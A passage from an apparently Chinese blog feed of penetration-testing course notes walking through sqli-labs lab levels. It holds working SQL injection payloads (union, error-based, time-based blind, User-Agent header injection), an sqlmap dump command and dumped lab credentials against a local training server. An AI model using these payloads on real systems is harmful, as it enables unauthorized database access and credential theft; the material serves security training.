punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span> from <span class="token function">users</span> limit <span class="token number">0,1</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less13</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less11/less13/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less11/less13/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT username, password FROM users WHERE username=('<span class="token variable">$uname</span>') and password=('<span class="token variable">$passwd</span>') LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>与Less12的唯一区别为闭合方式为**’)** &amp;#x20;<br><code>1')</code> <a name="nEKcR"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>用<strong>updatexml()函数</strong>进行报错注入 &amp;#x20;<br>updatexml（1，2，3）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">查询字段数<span class="token number">1</span><span class="token string">') order by 3-- + 登录后页面报错Unknown column '</span><span class="token number">3</span><span class="token string">' in '</span>order clause<span class="token string">'1'</span><span class="token punctuation">)</span> order by <span class="token number">2</span>-- +没有提示错误，说明有2个字段；判断回显点<span class="token number">1</span><span class="token string">') union select 1,2 -- +没有显示1，2查询数据库表-1'</span><span class="token punctuation">)</span> or updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +爆破数据表-1<span class="token string">') or updatexml(1,concat(0x7e,(select (table_name)from information_schema.tables where table_schema=database() limit 2,1),0x7e),1) -- +爆破字段名-1'</span><span class="token punctuation">)</span> or updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select <span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'users'</span> limit <span class="token number">8,1</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +爆破字段-1'<span class="token punctuation">)</span> or updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select username from <span class="token function">users</span> limit <span class="token number">0,1</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less12</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less11/less12/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less11/less12/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$uname</span><span class="token operator">=</span><span class="token string">'"'</span><span class="token builtin class-name">.</span><span class="token variable">$uname</span><span class="token builtin class-name">.</span><span class="token string">'"'</span><span class="token punctuation">;</span><span class="token variable">$passwd</span><span class="token operator">=</span><span class="token string">'"'</span><span class="token builtin class-name">.</span><span class="token variable">$passwd</span><span class="token builtin class-name">.</span><span class="token string">'"'</span><span class="token punctuation">;</span> @<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT username, password FROM users WHERE username=(<span class="token variable">$uname</span>) and password=(<span class="token variable">$passwd</span>) LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>1"</code></p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1””) and password=(“”) LIMIT 0,1’ at line 1</p></blockquote><p>用**”)**闭合<br>1”)<br>与Less11的区别就是闭合方式的不一样，注入方式完全一样。 <a name="LDkbm"></a></p><h1 id="试试报错注入"><a href="#试试报错注入" class="headerlink" title="试试报错注入"></a>试试报错注入</h1><p>之前用过了 extractvalue() 函数， updatexml()函数 ，现在试试 floor()函数&amp;#x20;<br><code>-1") union select count(*),concat(0x7e,database(),0x7e,**floor(rand(0)*2)**)x from information_schema.tables **group by x**-- +</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">爆破数据库-1<span class="token string">") union select count(*),concat(0x7e,database(),0x7e,floor(rand(0)*2))x from information_schema.tables group by x-- +爆破数据表-1"</span><span class="token punctuation">)</span> union <span class="token keyword">select</span> count<span class="token punctuation">(</span>*<span class="token punctuation">)</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select table_name from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> limit <span class="token number">0,1</span><span class="token punctuation">)</span>,0x7e,floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>*2<span class="token punctuation">))</span>x from information_schema.tables group by x-- +爆破字段表-1<span class="token string">") union select count(*),concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x-- +爆破字段-1"</span><span class="token punctuation">)</span> union <span class="token keyword">select</span> count<span class="token punctuation">(</span>*<span class="token punctuation">)</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select username from <span class="token function">users</span> limit <span class="token number">0,1</span><span class="token punctuation">)</span>,0x7e,floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>*2<span class="token punctuation">))</span>x from information_schema.tables group by x-- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less6</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/lees5/less6/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/lees5/less6/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string">'"'</span><span class="token builtin class-name">.</span><span class="token variable">$id</span><span class="token builtin class-name">.</span><span class="token string">'"'</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>?id=1"</code></p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1”” LIMIT 0,1’ at line 1</p></blockquote><p>less6与less5的唯一区别在于闭合方式为双引号”\ <a name="MK1Je"></a></p><h1 id="用updatexml-函数进行报错注入"><a href="#用updatexml-函数进行报错注入" class="headerlink" title="用updatexml()函数进行报错注入"></a>用updatexml()函数进行报错注入</h1><p>updatexml(1,1,1) <a name="nAWtm"></a></p><h2 id="查看数据库名称"><a href="#查看数据库名称" class="headerlink" title="查看数据库名称"></a>查看数据库名称</h2><p><code>?id=1" or updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</code></p><blockquote><p>XPATH syntax error: ‘~security’</p></blockquote><p><a name="CeOmH"></a></p><h2 id="查看数据表名称"><a href="#查看数据表名称" class="headerlink" title="查看数据表名称"></a>查看数据表名称</h2><p><code>?id=1" or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+</code></p><blockquote><p>XPATH syntax error: ‘<del>emails,referers,uagents,users</del>‘</p></blockquote><p><a name="vqZkZ"></a></p><h2 id="查看字段名称"><a href="#查看字段名称" class="headerlink" title="查看字段名称"></a>查看字段名称</h2><p><code>?id=1" or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),0x7e),1)--+</code></p><blockquote><p>XPATH syntax error: ‘<del>id,username,password</del>‘</p></blockquote><p><a name="dltOi"></a></p><h2 id="查看字段内容"><a href="#查看字段内容" class="headerlink" title="查看字段内容"></a>查看字段内容</h2><p><code>?id=1" or updatexml(1,concat(0x7e,(select group_concat(concat(username,' ^ ',password)) from users),0x7e),1)--+</code></p><blockquote><p>XPATH syntax error: ‘~Dumb ^ Dumb,Angelina ^ I-kill-y’</p></blockquote><p>substring(1,2,3)<br><code>?id=1" or updatexml(1,concat(0x7e,substring((select group_concat(concat(username,' ^ ',password)) from users),32,31),0x7e),1)--+</code></p><blockquote><p>XPATH syntax error: ‘~ou,Dummy ^ p@ssword,secure ^ cr’</p></blockquote><p>……</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less4</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/lees1/less4/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/lees1/less4/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string">'"'</span> <span class="token builtin class-name">.</span> <span class="token variable">$id</span> <span class="token builtin class-name">.</span> <span class="token string">'"'</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=(<span class="token variable">$id</span>) LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>加双引号和括号。</p><p><code>?id=1"</code>报错</p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘order by 4– “) LIMIT 0,1’ at line 1</p></blockquote><p>用”)闭合<br><code>?id=1") order by 4--+</code>报错<br><code>?id=1") order by 3--+</code>不报错,3列</p><p><code>?id=-1") union select 1,2,3 --+回显点2,3</code></p><p><code>?id=-1") union select 1,2,group_concat(schema_name) from information_schema.schemata --+</code></p><p><code>?id=-1")union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</code></p><p><code>?id=-1")union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+</code></p><p><code>?id=-1") union select 1,2,(select group_concat(username,password) from users)--+</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less3</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/lees1/less3/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/lees1/less3/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=('<span class="token variable">$id</span>') LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参数加了括号和单引号。</p><p><code>?id=1'</code>报错，有注入点。</p><blockquote><p>+号在浏览器中空格<br>#号的ascll码是%23</p></blockquote><p><code>?id=1') order by 4 --+</code>报错，没有第4列<br><code>?id=1') order by 3 --+</code>显示正常，有3列</p><p><code>?id=-1') union select 1,2,3 --+</code>显示2，3是回显点。</p><p><code>?id=-1') union select 1,2,group_concat(schema_name) from information_schema.schemata --+</code></p><p><code>?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code></p><p><code>?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns  where table_name ='users'--+</code></p><p><code>?id=-1') union select 1,2,(select group_concat(username,0x7e,password) from users)--+</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less2</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/lees1/less2/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/lees1/less2/</url>
      
        <content type="html"><![CDATA[<p><a name="YstTA"></a></p><h1 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码"></a>查看源码</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看源码，参数没有闭合，说明为数字型注入。</p><p><a name="t0fo6"></a></p><h1 id="找注入点"><a href="#找注入点" class="headerlink" title="找注入点"></a>找注入点</h1><blockquote><p><a href="http://192.168.31.193/Less-2/">http://192.168.31.193/Less-2/</a></p></blockquote><p>Please input the ID as parameter with numeric value&amp;#x20;<br>请输入ID作为带数值的参数<br><code>?id=1 and 1=2 #</code><br>1=2非真，页面就没有显示内容，说明数据被执行了。 <a name="FFdxf"></a></p><h1 id="判断字段"><a href="#判断字段" class="headerlink" title="判断字段"></a>判断字段</h1><p><code>?id=1 order by 4#</code><br>Unknown column ‘4’ in ‘order clause’<br>“order子句”中的未知列“4”<br><code>?id=1 order by 3#</code><br>显示正常，说明有三列。 <a name="VgMOQ"></a></p><h1 id="找回显点"><a href="#找回显点" class="headerlink" title="找回显点"></a>找回显点</h1><p><code>?id=-1 union select 1,2,3#</code><br>显示了2，3，说明2，3是回显点</p><p><a name="RnFWy"></a></p><h1 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h1><p><a name="NpH7F"></a></p><h2 id="查看数据库名"><a href="#查看数据库名" class="headerlink" title="查看数据库名"></a>查看数据库名</h2><p><code>?id=-1 union select 1,2,group_concat(schema_name) from informaion_schema.schemata #</code></p><blockquote><p>schema的复数:schemata</p></blockquote><p>显示了数据库名称：<br>information_schema,<br>challenges,<br>dvwa_com,<br>mysql,<br>performance_schema,<br>security,<br>sql,<br>sys <a name="oQxjF"></a></p><h2 id="查看数据表名称"><a href="#查看数据表名称" class="headerlink" title="查看数据表名称"></a>查看数据表名称</h2><p><code>?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</code></p><blockquote><p>where table_schema=database()：查到本数据库的所有表名</p></blockquote><p>显示数据表名称：<br>emails,<br>referers,<br>uagents,<br>users<br>查看users表字段名称<br><code>?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'#</code><br>显示字段名：<br>user_id,<br>first_name,<br>last_name,<br>user,<br>password,<br>avatar,<br>last_login,<br>failed_login,<br>USER,<br>CURRENT_CONNECTIONS,<br>TOTAL_CONNECTIONS,<br>id,<br>username,<br>password <a name="GOQCD"></a></p><h2 id="查看字段内容"><a href="#查看字段内容" class="headerlink" title="查看字段内容"></a>查看字段内容</h2><p><code>?id=-1 union select 1,2,(select group_concat(username,0x7e,password) from users)#</code><br>用户名<del>密码<br>Dumb</del>Dumb,<br>Angelina<del>I kill-you,<br>Dummy</del>p@ssword,<br>secure<del>crappy,<br>stupid</del>stupidity,<br>superman<del>genious,<br>batman</del>mob!le,<br>admin<del>admin,<br>admin1</del>admin1,<br>admin2<del>admin2,<br>admin3</del>admin3,<br>dhakkan<del>dumbo,<br>admin4</del>admin4</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less9</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less9/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less9/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>?id=1</code>显示You are in………..<br><code>id=1'</code>也显示You are in………..<br>&amp;#x20;尝试了N种闭合方式之后发现页面的<strong>回显都是一样的</strong>并且<strong>没有任何报错信息</strong>，<br>通过源码找到字符型闭合 ’<br>浅试一下<strong>时间盲注</strong>\ <a name="V17MH"></a></p><h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p><a name="kObnI"></a></p><h2 id="猜解数据库名称"><a href="#猜解数据库名称" class="headerlink" title="猜解数据库名称"></a>猜解数据库名称</h2><blockquote><p><strong>if(1,sleep(5),0)</strong><br>if()函数中，</p><ul><li>x为布尔盲注中的长度、字符猜测语句，如：length(database())=1</li><li>sleep()函数，a为时间间隔，如果前面的语句x为真，则在页面出来前间隔a秒；</li><li>0：占位</li></ul></blockquote><p><code>?id=-1' or if(ascii(mid(database(),1,1))&lt;=135,sleep(5),0)--+</code> 延时五秒了 <a name="kSZVm"></a></p><h2 id="猜解数据表名称"><a href="#猜解数据表名称" class="headerlink" title="猜解数据表名称"></a>猜解数据表名称</h2><p><code>?id=-1' or if(mid((select group_concat(table_name) from information_schema.tables where table_schema=database(),1,1)='e'),sleep(5),0)--+</code> <a name="j47RV"></a></p><h2 id="猜解字段名称"><a href="#猜解字段名称" class="headerlink" title="猜解字段名称"></a>猜解字段名称</h2><p><code>?id=-1' or if(mid((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1)='e',sleep(5),0)--+</code> <a name="aRdmK"></a></p><h2 id="猜解字段内容"><a href="#猜解字段内容" class="headerlink" title="猜解字段内容"></a>猜解字段内容</h2><p><code>?id=-1' or if(mid((select group_concat(username,0x7e,password) from users),1,1)='D',sleep(5),0)--+</code></p><p><a name="REjRI"></a></p><h1 id="用python跑时间盲注"><a href="#用python跑时间盲注" class="headerlink" title="用python跑时间盲注"></a>用python跑时间盲注</h1><p><a href="https://www.yuque.com/attachments/yuque/0/2022/py/29430497/1668822268338-e637faec-85f6-486f-aebb-01a572063c08.py?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2022/py/29430497/1668822268338-e637faec-85f6-486f-aebb-01a572063c08.py%22,%22name%22:%22time-blind.py%22,%22size%22:3708,%22type%22:%22text/x-python%22,%22ext%22:%22py%22,%22source%22:%22%22,%22status%22:%22done%22,%22mode%22:%22title%22,%22download%22:true,%22taskId%22:%22uae8e72ad-3444-4889-b4c9-55bfc76ab54%22,%22taskType%22:%22upload%22,%22__spacing%22:%22both%22,%22id%22:%22u943232bd%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">time-blind.py</a></p><blockquote><p>url = “<a href="http://192.168.31.193/Less-10/?id=1">http://192.168.31.193/Less-10/?id=1</a>‘“</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿guoyx<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/sql-python<span class="token punctuation">]</span>└─<span class="token comment"># python3 time-blind.py  </span>数据库名为-<span class="token operator">&gt;</span>s数据库名为-<span class="token operator">&gt;</span>se数据库名为-<span class="token operator">&gt;</span>sec数据库名为-<span class="token operator">&gt;</span>secu数据库名为-<span class="token operator">&gt;</span>secur数据库名为-<span class="token operator">&gt;</span>secur数据库名为-<span class="token operator">&gt;</span>secur数据库名为-<span class="token operator">&gt;</span>secury第一个表为-<span class="token operator">&gt;</span>e第一个表为-<span class="token operator">&gt;</span>em第一个表为-<span class="token operator">&gt;</span>ema第一个表为-<span class="token operator">&gt;</span>emai第二个表为-<span class="token operator">&gt;</span>r第二个表为-<span class="token operator">&gt;</span>re第二个表为-<span class="token operator">&gt;</span>ref第二个表为-<span class="token operator">&gt;</span>refr第三个表为-<span class="token operator">&gt;</span>u<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a name="FUnXU"></a></p><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿guoyx<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─<span class="token comment"># sqlmap -u 192.168.31.193/Less-9/?id=1 --batch -D "security" -T "users" --dump</span>Database: securityTable: <span class="token function">users</span><span class="token punctuation">[</span><span class="token number">13</span> entries<span class="token punctuation">]</span>+----+------------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> password   <span class="token operator">|</span> username <span class="token operator">|</span>+----+------------+----------+<span class="token operator">|</span> <span class="token number">1</span>  <span class="token operator">|</span> Dumb       <span class="token operator">|</span> Dumb     <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">2</span>  <span class="token operator">|</span> I-kill-you <span class="token operator">|</span> Angelina <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">3</span>  <span class="token operator">|</span> p@ssword   <span class="token operator">|</span> Dummy    <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">4</span>  <span class="token operator">|</span> crappy     <span class="token operator">|</span> secure   <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">5</span>  <span class="token operator">|</span> stupidity  <span class="token operator">|</span> stupid   <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">6</span>  <span class="token operator">|</span> genious    <span class="token operator">|</span> superman <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">7</span>  <span class="token operator">|</span> mob<span class="token operator">!</span>le     <span class="token operator">|</span> batman   <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">8</span>  <span class="token operator">|</span> admin      <span class="token operator">|</span> admin    <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">9</span>  <span class="token operator">|</span> admin1     <span class="token operator">|</span> admin1   <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">10</span> <span class="token operator">|</span> admin2     <span class="token operator">|</span> admin2   <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">11</span> <span class="token operator">|</span> admin3     <span class="token operator">|</span> admin3   <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">12</span> <span class="token operator">|</span> dumbo      <span class="token operator">|</span> dhakkan  <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">14</span> <span class="token operator">|</span> admin4     <span class="token operator">|</span> admin4   <span class="token operator">|</span>+----+------------+----------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less18</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less18/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less18/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT  users.username, users.password FROM users WHERE users.username=<span class="token variable">$uname</span> and users.password=<span class="token variable">$passwd</span> ORDER BY users.id DESC LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$result1</span> <span class="token operator">=</span> mysql_query<span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row1</span> <span class="token operator">=</span> mysql_fetch_array<span class="token punctuation">(</span><span class="token variable">$result1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>if<span class="token punctuation">(</span><span class="token variable">$row1</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token builtin class-name">echo</span> <span class="token string">'&lt;font color= "#FFFF00" font size = 3 &gt;'</span><span class="token punctuation">;</span><span class="token variable">$insert</span><span class="token operator">=</span><span class="token string">"INSERT INTO <span class="token variable"><span class="token variable">`</span>security<span class="token variable">`</span></span>.<span class="token variable"><span class="token variable">`</span>uagents<span class="token variable">`</span></span> (<span class="token variable"><span class="token variable">`</span>uagent<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>ip_address<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>username<span class="token variable">`</span></span>) VALUES ('<span class="token variable">$uagent</span>', '<span class="token variable">$IP</span>', <span class="token variable">$uname</span>)"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>源码这里当用户名跟密码都有输入的时候才能触发的，可以看到用户名和密码都被过筛了，也就是不能在这里进行SQL注入了</p><blockquote><p><strong>Your IP ADDRESS is: 192.168.31.119</strong></p></blockquote><p>网页记录了本地ip的信息，说明可能事数据库记录了本机的信息，<br>即后台获取了一些诸如Ip的信息保存 到数据库中，<br>并且页面返回了数据包<strong>user-agent</strong>的信息，<br>那么在请求头中就可能存在注入点\ <a name="hHPE1"></a></p><h1 id="请求头注入"><a href="#请求头注入" class="headerlink" title="请求头注入"></a>请求头注入</h1><blockquote><p>源代码标识获取浏览器信息，即user-Agent部分，<br>表示客户端通过什么浏览器向后台请求<br>在后面的请求中也有将该部分进行存储添加到数据库，<br>现在就可以通过一些手段在数据添加的同时进行注入</p></blockquote><p><a name="Y51fI"></a></p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p><a name="JHCAA"></a></p><h3 id="爆破数据库名称"><a href="#爆破数据库名称" class="headerlink" title="爆破数据库名称"></a>爆破数据库名称</h3><p>1’,1,updatexml(1,concat(0x7e,database(),0x7e),1))#<br>不能像常规的报错盲注一样直接上，我们得考虑一下闭合VALUES，假如我们利用的点是$uagent，那构建格式就应该是1’,1,1)#，在SQL语句中相当于</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">INSERT INTO <span class="token variable"><span class="token variable">`</span>security<span class="token variable">`</span></span><span class="token builtin class-name">.</span><span class="token variable"><span class="token variable">`</span>uagents<span class="token variable">`</span></span> <span class="token punctuation">(</span><span class="token variable"><span class="token variable">`</span>uagent<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>ip_address<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>username<span class="token variable">`</span></span><span class="token punctuation">)</span> VALUES <span class="token punctuation">(</span><span class="token string">'1'</span>,1,1<span class="token punctuation">)</span><span class="token comment">#, '$IP', $uname)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>Your IP ADDRESS is: 192.168.31.119<br>Your User Agent is: 1’,1,updatexml(1,concat(0x7e,database(),0x7e),1))#<br>XPATH syntax error: ‘<del>security</del>‘</p></blockquote><p><a name="I1uZq"></a></p><h3 id="爆破数据表"><a href="#爆破数据表" class="headerlink" title="爆破数据表"></a>爆破数据表</h3><p><code>1',1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1))#</code> <a name="tlVTR"></a></p><h3 id="爆破字段名"><a href="#爆破字段名" class="headerlink" title="爆破字段名"></a>爆破字段名</h3><p><code>1',1, updatexml(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name='users' limit 8,1),0x7e),1)) -- +</code> <a 